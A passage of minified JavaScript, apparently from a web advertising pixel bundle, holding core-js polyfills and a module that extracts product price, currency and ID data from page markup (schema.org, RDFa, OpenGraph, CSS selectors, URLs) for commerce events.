                if (a === r && z) return z;
                if (!o && a in x) return x[a];
                switch (a) {
                  case "keys":
                  case "values":
                  case "entries":
                    return function () {
                      return new c(this, a);
                    };
                }
                return function () {
                  return new c(this);
                };
              };
              var v = b + " Iterator",
                w = !1,
                x = a.prototype,
                y = x[l] || x["@@iterator"] || r && x[r],
                z = !o && y || q(r),
                A = "Array" == b && x.entries || y;
              if (A && (A = f(A.call(new a())), n !== Object.prototype && A.next && (k || f(A) === n || (g ? g(A, n) : "function" != typeof A[l] && i(A, l, p)), h(A, v, !0, !0), k && (m[v] = p))), "values" == r && y && "values" !== y.name && (w = !0, z = function () {
                return y.call(this);
              }), k && !t || x[l] === z || i(x, l, z), m[b] = z, r) if (u = {
                values: q("values"),
                keys: s ? z : q("keys"),
                entries: q("entries")
              }, t) for (a in u) !o && !w && a in x || j(x, a, u[a]);else d({
                target: b,
                proto: !0,
                forced: o || w
              }, u);
              return u;
            };
          }, function (a, b, c) {
            "use strict";

            var d = c(49).IteratorPrototype,
              e = c(78),
              f = c(26),
              g = c(52),
              h = c(27),
              i = function () {
                return this;
              };
            a.exports = function (a, b, c) {
              b = b + " Iterator";
              return a.prototype = e(d, {
                next: f(1, c)
              }), g(a, b, !1, !0), h[b] = i, a;
            };
          }, function (a, b, c) {
            a.exports = !c(11)(function () {
              function a() {}
              return a.prototype.constructor = null, Object.getPrototypeOf(new a()) !== a.prototype;
            });
          }, function (a, b, c) {
            var d = c(20),
              e = c(79),
              f = c(51),
              g = c(83),
              h = c(46),
              i = c(39)("IE_PROTO"),
              j = function () {},
              k = function () {
                var a = h("iframe"),
                  b = f.length;
                for (a.style.display = "none", g.appendChild(a), a.src = String("javascript:"), (a = a.contentWindow.document).open(), a.write("<script>document.F=Object</script>"), a.close(), k = a.F; b--;) delete k.prototype[f[b]];
                return k();
              };
            a.exports = Object.create || function (a, b) {
              var c;
              return null !== a ? (j.prototype = d(a), c = new j(), j.prototype = null, c[i] = a) : c = k(), void 0 === b ? c : e(c, b);
            }, c(40)[i] = !0;
          }, function (a, b, c) {
            b = c(19);
            var d = c(25),
              e = c(20),
              f = c(80);
            a.exports = b ? Object.defineProperties : function (a, b) {
              e(a);
              for (var c, g = f(b), h = g.length, i = 0; h > i;) d.f(a, c = g[i++], b[c]);
              return a;
            };
          }, function (a, b, c) {
            var d = c(81),
              e = c(51);
            a.exports = Object.keys || function (a) {
              return d(a, e);
            };
          }, function (a, b, c) {
            var d = c(14),
              e = c(37),
              f = c(41)(!1),
              g = c(40);
            a.exports = function (a, b) {
              var c;
              a = e(a);
              var h = 0,
                i = [];
              for (c in a) !d(g, c) && d(a, c) && i.push(c);
              for (; b.length > h;) d(a, c = b[h++]) && (~f(i, c) || i.push(c));
              return i;
            };
          }, function (a, b, c) {
            var d = c(33),
              e = Math.max,
              f = Math.min;
            a.exports = function (a, b) {
              a = d(a);
              return a < 0 ? e(a + b, 0) : f(a, b);
            };
          }, function (a, b, c) {
            b = c(6).document;
            a.exports = b && b.documentElement;
          }, function (a, b, c) {
            "use strict";

            var d = c(53);
            b = {};
            b[c(4)("toStringTag")] = "z", a.exports = "[object z]" !== String(b) ? function () {
              return "[object " + d(this) + "]";
            } : b.toString;
          }, function (a, b, c) {
            var d = c(86);
            a.exports = Object.setPrototypeOf || ("__proto__" in {} ? function () {
              var a,
                b = !1,
                c = {};
              try {
                (a = Object.getOwnPropertyDescriptor(Object.prototype, "__proto__").set).call(c, []), b = c instanceof Array;
              } catch (a) {}
              return function (c, e) {
                return d(c, e), b ? a.call(c, e) : c.__proto__ = e, c;
              };
            }() : void 0);
          }, function (a, b, c) {
            var d = c(12),
              e = c(20);
            a.exports = function (a, b) {
              if (e(a), !d(b) && null !== b) throw TypeError("Can't set " + String(b) + " as a prototype");
            };
          }, function (a, b, c) {
            var d = c(13);
            a.exports = function (a, b, c, e) {
              e && e.enumerable ? a[b] = c : d(a, b, c);
            };
          }, function (a, b, c) {
            a = !c(89)(function (a) {
              Array.from(a);
            });
            c(7)({
              target: "Array",
              stat: !0,
              forced: a
            }, {
              from: c(90)
            });
          }, function (a, b, c) {
            var d = c(4)("iterator"),
              e = !1;
            try {
              var f = 0;
              b = {
                next: function () {
                  return {
                    done: !!f++
                  };
                },
                "return": function () {
                  e = !0;
                }
              };
              b[d] = function () {
                return this;
              }, Array.from(b, function () {
                throw 2;
              });
            } catch (a) {}
            a.exports = function (a, b) {
              if (!b && !e) return !1;
              b = !1;
              try {
                var c = {};
                c[d] = function () {
                  return {
                    next: function () {
                      return {
                        done: b = !0
                      };
                    }
                  };
                }, a(c);
              } catch (a) {}
              return b;
            };
          }, function (a, b, c) {
            "use strict";

            var d = c(31),
              e = c(23),
              f = c(91),
              g = c(92),
              h = c(18),
              i = c(93),
              j = c(94);
            a.exports = function (a) {
              var b,
                c,
                k,
                l,
                m = e(a),
                n = "function" == typeof this ? this : Array,
                o = arguments.length,
                p = o > 1 ? arguments[1] : void 0,
                q = void 0 !== p,
                r = 0,
                s = j(m);
              if (q && (p = d(p, o > 2 ? arguments[2] : void 0, 2)), null == s || n == Array && g(s)) for (c = new n(b = h(m.length)); b > r; r++) i(c, r, q ? p(m[r], r) : m[r]);else for (l = s.call(m), c = new n(); !(k = l.next()).done; r++) i(c, r, q ? f(l, p, [k.value, r], !0) : k.value);
              return c.length = r, c;
            };
          }, function (a, b, c) {
            var d = c(20);
            a.exports = function (a, b, c, e) {
              try {
                return e ? b(d(c)[0], c[1]) : b(c);
              } catch (b) {
                e = a["return"];
                throw void 0 !== e && d(e.call(a)), b;
              }
            };
          }, function (a, b, c) {
            var d = c(27),
              e = c(4)("iterator"),
              f = Array.prototype;
            a.exports = function (a) {
              return void 0 !== a && (d.Array === a || f[e] === a);
            };
          }, function (a, b, c) {
            "use strict";

            var d = c(35),
              e = c(25),
              f = c(26);
            a.exports = function (a, b, c) {
              b = d(b);
              b in a ? e.f(a, b, f(0, c)) : a[b] = c;
            };
          }, function (a, b, c) {
            var d = c(53),
              e = c(4)("iterator"),
              f = c(27);
            a.exports = function (a) {
              if (null != a) return a[e] || a["@@iterator"] || f[d(a)];
            };
          }, function (a, b, c) {
            c(96), a.exports = c(15)("Array", "includes");
          }, function (a, b, c) {
            "use strict";

            var d = c(41)(!0);
            c(7)({
              target: "Array",
              proto: !0
            }, {
              includes: function (a) {
                return d(this, a, arguments.length > 1 ? arguments[1] : void 0);
              }
            }), c(54)("includes");
          }, function (a, b, c) {
            c(98), a.exports = c(15)("Array", "map");
          }, function (a, b, c) {
            "use strict";

            var d = c(30)(1);
            a = c(48)("map");
            c(7)({
              target: "Array",
              proto: !0,
              forced: !a
            }, {
              map: function (a) {
                return d(this, a, arguments[1]);
              }
            });
          }, function (a, b, c) {
            c(100), a.exports = c(15)("Array", "reduce");
          }, function (a, b, c) {
            "use strict";

            var d = c(101);
            a = c(55)("reduce");
            c(7)({
              target: "Array",
              proto: !0,
              forced: a
            }, {
              reduce: function (a) {
                return d(this, a, arguments.length, arguments[1], !1);
              }
            });
          }, function (a, b, c) {
            var d = c(44),
              e = c(23),
              f = c(32),
              g = c(18);
            a.exports = function (a, b, c, h, i) {
              d(b);
              a = e(a);
              var j = f(a),
                k = g(a.length),
                l = i ? k - 1 : 0,
                m = i ? -1 : 1;
              if (c < 2) for (;;) {
                if (l in j) {
                  h = j[l], l += m;
                  break;
                }
                if (l += m, i ? l < 0 : k <= l) throw TypeError("Reduce of empty array with no initial value");
              }
              for (; i ? l >= 0 : k > l; l += m) l in j && (h = b(h, j[l], l, a));
              return h;
            };
          }, function (a, b, c) {
            c(103), a.exports = c(15)("Array", "find");
          }, function (a, b, c) {
            "use strict";

            var d = c(30)(5);
            a = !0;
            "find" in [] && Array(1).find(function () {
              a = !1;
            }), c(7)({
              target: "Array",
              proto: !0,
              forced: a
            }, {
              find: function (a) {
                return d(this, a, arguments.length > 1 ? arguments[1] : void 0);
              }
            }), c(54)("find");
          }, function (a, b, c) {
            c(105), a.exports = c(15)("Array", "indexOf");
          }, function (a, b, c) {
            "use strict";

            var d = c(41)(!1),
              e = [].indexOf,
              f = !!e && 1 / [1].indexOf(1, -0) < 0;
            a = c(55)("indexOf");
            c(7)({
              target: "Array",
              proto: !0,
              forced: f || a
            }, {
              indexOf: function (a) {
                return f ? e.apply(this, arguments) || 0 : d(this, a, arguments[1]);
              }
            });
          }, function (a, b, c) {
            c(107), a.exports = c(15)("String", "startsWith");
          }, function (a, b, c) {
            "use strict";

            var d = c(18),
              e = c(108);
            a = c(110)("startsWith");
            var f = "".startsWith;
            c(7)({
              target: "String",
              proto: !0,
              forced: !a
            }, {
              startsWith: function (a) {
                var b = e(this, a, "startsWith"),
                  c = d(Math.min(arguments.length > 1 ? arguments[1] : void 0, b.length)),
                  g = String(a);
                return f ? f.call(b, g, c) : b.slice(c, c + g.length) === g;
              }
            });
          }, function (a, b, c) {
            var d = c(109),
              e = c(24);
            a.exports = function (a, b, c) {
              if (d(b)) throw TypeError("String.prototype." + c + " doesn't accept regex");
              return String(e(a));
            };
          }, function (a, b, c) {
            var d = c(12),
              e = c(22),
              f = c(4)("match");
            a.exports = function (a) {
              var b;
              return d(a) && (void 0 !== (b = a[f]) ? !!b : "RegExp" == e(a));
            };
          }, function (a, b, c) {
            var d = c(4)("match");
            a.exports = function (a) {
              var b = /./;
              try {
                "/./"[a](b);
              } catch (c) {
                try {
                  return b[d] = !1, "/./"[a](b);
                } catch (a) {}
              }
              return !1;
            };
          }, function (a, c, d) {
            "use strict";

            d.r(c);
            var e = {};
            d.r(e), d.d(e, "BUTTON_SELECTOR_SEPARATOR", function () {
              return Y;
            }), d.d(e, "BUTTON_SELECTORS", function () {
              return Z;
            }), d.d(e, "BUTTON_SELECTOR_FORM_BLACKLIST", function () {
              return pa;
            }), d.d(e, "EXTENDED_BUTTON_SELECTORS", function () {
              return qa;
            }), d.d(e, "EXPLICIT_BUTTON_SELECTORS", function () {
              return ra;
            });
            var h = d(8),
              i = d(28),
              j = d(9),
              k = d.n(j);
            j = d(1);
            var l = d.n(j);
            j = d(2);
            var m = d.n(j);
            j = d(3);
            var n = d.n(j);
            j = d(10);
            var o = d.n(j);
            j = d(0);
            var p = d.n(j),
              q = function (a) {
                for (var c = p()(i.a, function (a) {
                    return '[vocab$="'.concat("http://schema.org/", '"][typeof$="').concat(a, '"]');
                  }).join(", "), d = [], c = n()(b.querySelectorAll(c)), e = []; c.length > 0;) {
                  var s = c.pop();
                  if (!o()(d, s)) {
                    var v = {
                      "@context": "http://schema.org"
                    };
                    e.push({
                      htmlElement: s,
                      jsonLD: v
                    });
                    for (s = [{
                      element: s,
                      workingNode: v
                    }]; s.length;) {
                      v = s.pop();
                      var w = v.element;
                      v = v.workingNode;
                      var f = l()(w.getAttribute("typeof"));
                      v["@type"] = f;
                      for (f = n()(w.querySelectorAll("[property]")).reverse(); f.length;) {
                        var x = f.pop();
                        if (!o()(d, x)) {
                          d.push(x);
                          var g = l()(x.getAttribute("property"));
                          if (x.hasAttribute("typeof")) {
                            var q = {};
                            v[g] = q, s.push({
                              element: w,
                              workingNode: v
                            }), s.push({
                              element: x,
                              workingNode: q
                            });
                            break;
                          }
                          v[g] = Object(h.b)(x);
                        }
                      }
                    }
                  }
                }
                return m()(e, function (b) {
                  return k()(b.htmlElement, a);
                });
              };
            function r(a) {
              return (r = "function" == typeof Symbol && "symbol" == g(typeof Symbol === "function" ? Symbol.iterator : "@@iterator") ? function (a) {
                return typeof a === "undefined" ? "undefined" : g(a);
              } : function (a) {
                return a && "function" == typeof Symbol && a.constructor === Symbol && a !== (typeof Symbol === "function" ? Symbol.prototype : "@@prototype") ? "symbol" : typeof a === "undefined" ? "undefined" : g(a);
              })(a);
            }
            var s = function (a) {
              return ("object" === ("undefined" == typeof HTMLElement ? "undefined" : r(HTMLElement)) ? a instanceof HTMLElement : null != a && "object" === r(a) && null !== a && 1 === a.nodeType && "string" == typeof a.nodeName) ? a : null;
            };
            j = d(5);
            var t = d.n(j);
            function u(a, b) {
              for (var c = 0; c < b.length; c++) {
                var d = b[c];
                d.enumerable = d.enumerable || !1, d.configurable = !0, "value" in d && (d.writable = !0), Object.defineProperty(a, d.key, d);
              }
            }
            function v(a, b, c) {
              return b in a ? Object.defineProperty(a, b, {
                value: c,
                enumerable: !0,
                configurable: !0,
                writable: !0
              }) : a[b] = c, a;
            }
            var w = function () {
                function a(c) {
                  !function (a, b) {
                    if (!(a instanceof b)) throw new TypeError("Cannot call a class as a function");
                  }(this, a), v(this, "_anchorElement", void 0), v(this, "_parsedQuery", void 0), this._anchorElement = b.createElement("a"), this._anchorElement.href = c;
                }
                var c, d, e;
                return c = a, (d = [{
                  key: "toString",
                  value: function () {
                    return this._anchorElement.href;
                  }
                }, {
                  key: "toJSON",
                  value: function () {
                    return this._anchorElement.href;
                  }
                }, {
                  key: "hash",
                  get: function () {
                    return this._anchorElement.hash;
                  }
                }, {
                  key: "host",
                  get: function () {
                    return this._anchorElement.host;
                  }
                }, {
                  key: "hostname",
                  get: function () {
                    return this._anchorElement.hostname;
                  }
                }, {
                  key: "pathname",
                  get: function () {
                    return this._anchorElement.pathname.replace(/(^\/?)/, "/");
                  }
                }, {
                  key: "port",
                  get: function () {
                    return this._anchorElement.port;
                  }
                }, {
                  key: "protocol",
                  get: function () {
                    return this._anchorElement.protocol;
                  }
                }, {
                  key: "searchParams",
                  get: function () {
                    var a = this;
                    return {
                      get: function (b) {
                        if (null != a._parsedQuery) return a._parsedQuery[b] || null;
                        var c = a._anchorElement.search;
                        if ("" === c || null == c) return a._parsedQuery = {}, null;
                        c = "?" === c[0] ? c.substring(1) : c;
                        return a._parsedQuery = t()(c.split("&"), function (a, b) {
                          b = b.split("=");
                          return null == b || 2 !== b.length ? a : function (a) {
                            for (var b = 1; b < arguments.length; b++) {
                              var c = null != arguments[b] ? arguments[b] : {},
                                d = Object.keys(c);
                              "function" == typeof Object.getOwnPropertySymbols && (d = d.concat(Object.getOwnPropertySymbols(c).filter(function (a) {
                                return Object.getOwnPropertyDescriptor(c, a).enumerable;
                              }))), d.forEach(function (b) {
                                v(a, b, c[b]);
                              });
                            }
                            return a;
                          }({}, a, v({}, decodeURIComponent(b[0]), decodeURIComponent(b[1])));
                        }, {}), a._parsedQuery[b] || null;
                      }
                    };
                  }
                }]) && u(c.prototype, d), e && u(c, e), a;
              }(),
              x = /^\s*:scope/gi;
            j = function a(b, c) {
              if (">" === c[c.length - 1]) return [];
              var d = ">" === c[0];
              if ((a.CAN_USE_SCOPE || !c.match(x)) && !d) return b.querySelectorAll(c);
              var e = c;
              d && (e = ":scope ".concat(c));
              d = !1;
              b.id || (b.id = "__fb_scoped_query_selector_" + Date.now(), d = !0);
              c = b.querySelectorAll(e.replace(x, "#" + b.id));
              return d && (b.id = ""), c;
            };
            j.CAN_USE_SCOPE = !0;
            var y = b.createElement("div");
            try {
              y.querySelectorAll(":scope *");
            } catch (a) {
              j.CAN_USE_SCOPE = !1;
            }
            var z = j;
            y = d(29);
            var A = d.n(y);
            j = d(16);
            var B = d.n(j);
            y = (d(43), d(21));
            var C = d.n(y);
            function D(a) {
              return function (a) {
                if (Array.isArray(a)) {
                  for (var b = 0, c = new Array(a.length); b < a.length; b++) c[b] = a[b];
                  return c;
                }
              }(a) || function (a) {
                if ((typeof Symbol === "function" ? Symbol.iterator : "@@iterator") in Object(a) || "[object Arguments]" === Object.prototype.toString.call(a)) return Array.from(a);
              }(a) || function () {
                throw new TypeError("Invalid attempt to spread non-iterable instance");
              }();
            }
            function E(a, b) {
              return function (a) {
                if (Array.isArray(a)) return a;
              }(a) || function (a, b) {
                var c = [],
                  d = !0,
                  e = !1,
                  f = void 0;
                try {
                  for (var a, g = a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](); !(d = (a = g.next()).done) && (c.push(a.value), !b || c.length !== b); d = !0);
                } catch (a) {
                  e = !0, f = a;
                } finally {
                  try {
                    d || null == g["return"] || g["return"]();
                  } finally {
                    if (e) throw f;
                  }
                }
                return c;
              }(a, b) || function () {
                throw new TypeError("Invalid attempt to destructure non-iterable instance");
              }();
            }
            var F = "children(",
              G = "closest(";
            function aa(a, b) {
              return ba(a, m()(p()(b.split(/((?:closest|children)\([^)]+\))/), function (a) {
                return a.trim();
              }), Boolean));
            }
            function ba(a, b) {
              var c = function (a, b) {
                return b.substring(a.length, b.length - 1).trim();
              };
              b = p()(b, function (a) {
                return C()(a, G) ? {
                  selector: c(G, a),
                  type: "closest"
                } : C()(a, F) ? {
                  selector: c(F, a),
                  type: "children"
                } : {
                  selector: a,
                  type: "standard"
                };
              });
              b = t()(b, function (a, b) {
                if ("standard" !== b.type) return [].concat(D(a), [b]);
                var c = a[a.length - 1];
                return c && "standard" === c.type ? (c.selector += " " + b.selector, a) : [].concat(D(a), [b]);
              }, []);
              return t()(b, function (a, b) {
                return m()(A()(p()(a, function (a) {
                  return ca(a, b);
                })), Boolean);
              }, [a]);
            }
            var ca = function (a, b) {
              var c = b.selector;
              switch (b.type) {
                case "children":
                  if (null == a) return [];
                  b = E(c.split(","), 2);
                  var d = b[0],
                    e = b[1];
                  return [n()(m()(n()(a.childNodes), function (a) {
                    return null != s(a) && a.matches(e);
                  }))[parseInt(d, 0)]];
                case "closest":
                  return a.parentNode ? [a.parentNode.closest(c)] : [];
                default:
                  return n()(z(a, c));
              }
            };
            if (Element.prototype.matches || (Element.prototype.matches = Element.prototype.msMatchesSelector || Element.prototype.webkitMatchesSelector), !Element.prototype.closest) {
              var da = b.documentElement;
              Element.prototype.closest = function (a) {
                var b = this;
                if (!da.contains(b)) return null;
                do {
                  if (b.matches(a)) return b;
                  b = b.parentElement || b.parentNode;
                } while (null !== b && 1 === b.nodeType);
                return null;
              };
            }
            var ea = d(42);
            function H(a, b, c) {
              return b in a ? Object.defineProperty(a, b, {
                value: c,
                enumerable: !0,
                configurable: !0,
                writable: !0
              }) : a[b] = c, a;
            }
            var fa = function () {
                var a = t()(Object(ea.extractOpenGraph)(), function (a, b) {
                  return function (a) {
                    for (var b = 1; b < arguments.length; b++) {
                      var c = null != arguments[b] ? arguments[b] : {},
                        d = Object.keys(c);
                      "function" == typeof Object.getOwnPropertySymbols && (d = d.concat(Object.getOwnPropertySymbols(c).filter(function (a) {
                        return Object.getOwnPropertyDescriptor(c, a).enumerable;
                      }))), d.forEach(function (b) {
                        H(a, b, c[b]);
                      });
                    }
                    return a;
                  }({}, a, H({}, b.key, a[b.key] || b.value));
                }, {});
                return "product.item" !== a["og:type"] ? null : {
                  "@context": "http://schema.org",
                  "@type": "Product",
                  offers: {
                    price: a["product:price:amount"],
                    priceCurrency: a["product:price:currency"]
                  },
                  productID: a["product:retailer_item_id"]
                };
              },
              I = {
                PATH: "PATH",
                QUERY_STRING: "QUERY_STRING"
              };
            function J(a) {
              return function (a) {
                if (Array.isArray(a)) {
                  for (var b = 0, c = new Array(a.length); b < a.length; b++) c[b] = a[b];
                  return c;
                }
              }(a) || function (a) {
                if ((typeof Symbol === "function" ? Symbol.iterator : "@@iterator") in Object(a) || "[object Arguments]" === Object.prototype.toString.call(a)) return Array.from(a);
              }(a) || function () {
                throw new TypeError("Invalid attempt to spread non-iterable instance");
              }();
            }
            function K(a, b) {
              a = l()(s(a)).className;
              b = l()(s(b)).className;
              a = a.split(" ");
              var c = b.split(" ");
              return a.filter(function (a) {
                return c.includes(a);
              }).toString();
            }
            var L = {
              DO_NOT_MATCH: 0,
              CLASS_NAME_MATCHES: 1,
              NEED_MORE_CHECKING: 2
            };
            function M(a, b) {
              if (a && !b || !a && b || void 0 === a || void 0 === b || a.nodeType !== b.nodeType || a.nodeName !== b.nodeName) return L.DO_NOT_MATCH;
              a = s(a);
              b = s(b);
              if (a && !b || !a && b) return L.DO_NOT_MATCH;
              if (a && b) {
                if (a.tagName !== b.tagName) return L.DO_NOT_MATCH;
                if (a.className === b.className) return L.CLASS_NAME_MATCHES;
              }
              return L.NEED_MORE_CHECKING;
            }
            function N(a, b, c, d) {
              var e = M(a, d.node);
              return e === L.DO_NOT_MATCH ? e : c > 0 && b !== d.index ? L.DO_NOT_MATCH : 1 === e ? L.CLASS_NAME_MATCHES : 0 === d.relativeClass.length ? L.DO_NOT_MATCH : (K(a, d.node), d.relativeClass, L.CLASS_NAME_MATCHES);
            }
            function O(a, b, c, d) {
              if (d === c.length - 1) {
                if (!N(a, b, d, c[d])) return null;
                var e = s(a);
                if (e) return [e];
              }
              if (!a || !N(a, b, d, c[d])) return null;
              for (e = [], b = a.firstChild, a = 0; b;) {
                var f = O(b, a, c, d + 1);
                f && e.push.apply(e, J(f)), b = b.nextSibling, a += 1;
              }
              return e;
            }
            function ga(a, b) {
              a = function (a, b) {
                for (var c = function (a) {
                    var b = a.parentNode;
                    if (!b) return -1;
                    for (var b = b.firstChild, c = 0; b && b !== a;) b = b.nextSibling, c += 1;
                    return b === a ? c : -1;
                  }, a = a, b = b, d = [], e = []; !a.isSameNode(b);) {
                  var f = M(a, b);
                  if (f === L.DO_NOT_MATCH) return null;
                  var g = "";
                  if (f === L.NEED_MORE_CHECKING && 0 === (g = K(a, b)).length) return null;
                  if (d.push({
                    node: a,
                    relativeClass: g,
                    index: c(a)
                  }), e.push(b), a = a.parentNode, b = b.parentNode, !a || !b) return null;
                }
                return a && b && a.isSameNode(b) && d.length > 0 ? {
                  parentNode: a,
                  node1Tree: d.reverse(),
                  node2Tree: e.reverse()
                } : null;
              }(a, b);
              if (!a) return null;
              b = function (a, b, c) {
                for (var d = [], a = a.firstChild; a;) a.isSameNode(b.node) || a.isSameNode(c) || !M(b.node, a) || d.push(a), a = a.nextSibling;
                return d;
              }(a.parentNode, a.node1Tree[0], a.node2Tree[0]);
              return b && 0 !== b.length ? function (a, b) {
                var c = [],
                  d = !0,
                  e = !1,
                  f = void 0;
                try {
                  for (var a, g = a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](); !(d = (a = g.next()).done); d = !0) {
                    a = O(a.value, 0, b, 0);
                    a && c.push.apply(c, J(a));
                  }
                } catch (a) {
                  e = !0, f = a;
                } finally {
                  try {
                    d || null == g["return"] || g["return"]();
                  } finally {
                    if (e) throw f;
                  }
                }
                return c;
              }(b, a.node1Tree) : null;
            }
            function P(a, b) {
              return function (a) {
                if (Array.isArray(a)) return a;
              }(a) || function (a, b) {
                var c = [],
                  d = !0,
                  e = !1,
                  f = void 0;
                try {
                  for (var a, g = a[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"](); !(d = (a = g.next()).done) && (c.push(a.value), !b || c.length !== b); d = !0);
                } catch (a) {
                  e = !0, f = a;
                } finally {
                  try {
                    d || null == g["return"] || g["return"]();
                  } finally {
                    if (e) throw f;
                  }
                }
                return c;
              }(a, b) || function () {
                throw new TypeError("Invalid attempt to destructure non-iterable instance");
              }();
            }
            function Q(a, b, c) {
              return b in a ? Object.defineProperty(a, b, {
                value: c,
                enumerable: !0,
                configurable: !0,
                writable: !0
              }) : a[b] = c, a;
            }
            var ha = d(42).getSchemaDotOrgProductNodesAsJsonLD,
              R = t()(["CONSTANT_VALUE", "CSS", "URI", "SCHEMA_DOT_ORG", "JSON_LD", "RDFA", "OPEN_GRAPH", "GTM", "META_TAG", "GLOBAL_VARIABLE"], function (a, b, c) {
                return function (a) {
                  for (var b = 1; b < arguments.length; b++) {
                    var c = null != arguments[b] ? arguments[b] : {},
                      d = Object.keys(c);
                    "function" == typeof Object.getOwnPropertySymbols && (d = d.concat(Object.getOwnPropertySymbols(c).filter(function (a) {
                      return Object.getOwnPropertyDescriptor(c, a).enumerable;
                    }))), d.forEach(function (b) {
                      Q(a, b, c[b]);
                    });
                  }
                  return a;
                }({}, a, Q({}, b, c));
              }, {}),
              S = {
                "@context": "http://schema.org",
                "@type": "Product",
                additionalType: void 0,
                offers: {
                  price: void 0,
                  priceCurrency: void 0
                },
                productID: void 0
              },
              T = function (a, b, c) {
                if (null == c) return a;
                var d = l()(a.offers);
                return {
                  "@context": "http://schema.org",
                  "@type": "Product",
                  additionalType: null != a.additionalType ? a.additionalType : "content_type" === b ? c : void 0,
                  offers: {
                    price: null != d.price ? d.price : "value" === b ? c : void 0,
                    priceCurrency: null != d.priceCurrency ? d.priceCurrency : "currency" === b ? c : void 0
                  },
                  productID: null != a.productID ? a.productID : "content_ids" === b ? c : void 0
                };
              },
              ia = 2;
            function a(a, b) {
              b = b.sort(function (a, b) {
                return R[a.extractorType] > R[b.extractorType] ? 1 : -1;
              });
              return m()(A()(p()(b, function (b) {
                switch (b.extractorType) {
                  case "SCHEMA_DOT_ORG":
                    return p()(ha(a), function (a) {
                      return {
                        extractorID: b.id,
                        jsonLD: a.jsonLD
                      };
                    });
                  case "RDFA":
                    return p()(q(a), function (a) {
                      return {
                        extractorID: b.id,
                        jsonLD: a.jsonLD
                      };
                    });
                  case "OPEN_GRAPH":
                    return {
                      extractorID: b.id,
                      jsonLD: fa()
                    };
                  case "CSS":
                    var c = p()(b.extractorConfig.parameterSelectors, function (b) {
                      return null != (b = aa(a, b.selector)) ? b[0] : b;
                    });
                    if (null == c) return null;
                    if (c.length === ia) {
                      var d = c[0],
                        e = c[1];
                      if (null != d && null != e) {
                        d = ga(d, e);
                        d && c.push.apply(c, d);
                      }
                    }
                    var g = b.extractorConfig.parameterSelectors[0].parameterType;
                    e = p()(c, function (a) {
                      var b;
                      a = (null != (b = a) ? b.innerText : b) || (null != (b = a) ? b.textContent : b);
                      return [g, a];
                    });
                    d = p()(m()(e, function (a) {
                      return "totalPrice" !== P(a, 1)[0];
                    }), function (a) {
                      a = P(a, 2);
                      var b = a[0];
                      a = a[1];
                      return T(S, b, a);
                    });
                    if ("InitiateCheckout" === b.eventType || "Purchase" === b.eventType) {
                      c = B()(e, function (a) {
                        return "totalPrice" === P(a, 1)[0];
                      });
                      c && (d = [{
                        "@context": "http://schema.org",
                        "@type": "ItemList",
                        itemListElement: p()(d, function (a, b) {
                          return {
                            "@type": "ListItem",
                            item: a,
                            position: b + 1
                          };
                        }),
                        totalPrice: null != c[1] ? c[1] : void 0
                      }]);
                    }
                    return p()(d, function (a) {
                      return {
                        extractorID: b.id,
                        jsonLD: a
                      };
                    });
                  case "CONSTANT_VALUE":
                    e = b.extractorConfig;
                    c = e.parameterType;
                    d = e.value;
                    return {
                      extractorID: b.id,
                      jsonLD: T(S, c, d)
                    };
                  case "URI":
                    e = b.extractorConfig.parameterType;
                    c = function (a, b, c) {
                      a = new w(a);
                      switch (b) {
                        case I.PATH:
                          b = m()(p()(a.pathname.split("/"), function (a) {
                            return a.trim();
                          }), Boolean);
                          var d = parseInt(c, 10);
                          return d < b.length ? b[d] : null;
                        case I.QUERY_STRING:
                          return a.searchParams.get(c);
                      }
                      return null;
                    }(f.location.href, b.extractorConfig.context, b.extractorConfig.value);
                    return {
                      extractorID: b.id,
                      jsonLD: T(S, e, c)
                    };
                  default:
                    throw new Error("Extractor ".concat(b.extractorType, " not mapped"));
                }
              })), function (a) {
                a = a.jsonLD;
                return Boolean(a);
              });
            }
            a.EXTRACTOR_PRECEDENCE = R;
            var ja = a;
            function ka(a) {
              switch (a.extractor_type) {
                case "CSS":
                  if (null == a.extractor_config) throw new Error("extractor_config must be set");
                  var b = a.extractor_config;
                  if (b.parameter_type) throw new Error("extractor_config must be set");
                  return {
                    domainURI: new w(a.domain_uri),
                    eventType: a.event_type,
                    extractorConfig: (b = b, {
                      parameterSelectors: p()(b.parameter_selectors, function (a) {
                        return {
                          parameterType: a.parameter_type,
                          selector: a.selector
                        };
                      })
                    }),
                    extractorType: "CSS",
                    id: l()(a.id),
                    ruleId: null != (b = a.event_rule) ? b.id : b
                  };
                case "CONSTANT_VALUE":
                  if (null == a.extractor_config) throw new Error("extractor_config must be set");
                  b = a.extractor_config;
                  if (b.parameter_selectors) throw new Error("extractor_config must be set");
                  return {
                    domainURI: new w(a.domain_uri),
                    eventType: a.event_type,
                    extractorConfig: la(b),
                    extractorType: "CONSTANT_VALUE",
                    id: l()(a.id),
                    ruleId: null != (b = a.event_rule) ? b.id : b
                  };
                case "URI":
                  if (null == a.extractor_config) throw new Error("extractor_config must be set");
                  b = a.extractor_config;
                  if (b.parameter_selectors) throw new Error("extractor_config must be set");
                  return {
                    domainURI: new w(a.domain_uri),
                    eventType: a.event_type,
                    extractorConfig: ma(b),
                    extractorType: "URI",
                    id: l()(a.id),
                    ruleId: null != (b = a.event_rule) ? b.id : b
                  };
                default:
                  return {
                    domainURI: new w(a.domain_uri),
                    eventType: a.event_type,
                    extractorType: a.extractor_type,
                    id: l()(a.id),
                    ruleId: null != (b = a.event_rule) ? b.id : b
                  };
              }
            }
            function la(a) {
              return {
                parameterType: a.parameter_type,
                value: a.value
              };
            }
            function ma(a) {
              return {
                context: a.context,
                parameterType: a.parameter_type,
                value: a.value
              };
            }
            a.EXTRACTOR_PRECEDENCE = R;
            var na = function (a, b, c) {
                return "string" != typeof a ? "" : a.length < c && 0 === b ? a : [].concat(n()(a)).slice(b, b + c).join("");
              },
              U = function (a, b) {
                return na(a, 0, b);
              },
              V = d(17),
              W = 120,
              oa = ["button", "submit", "input", "li", "option", "progress", "param"];
            function X(a) {
              var b = Object(V.a)(a);
              if (null != b && "" !== b) return U(b, W);
              b = a.type;
              a = a.value;
              return null != b && o()(oa, b) && null != a && "" !== a ? U(a, W) : U("", W);
            }
            var Y = ", ",
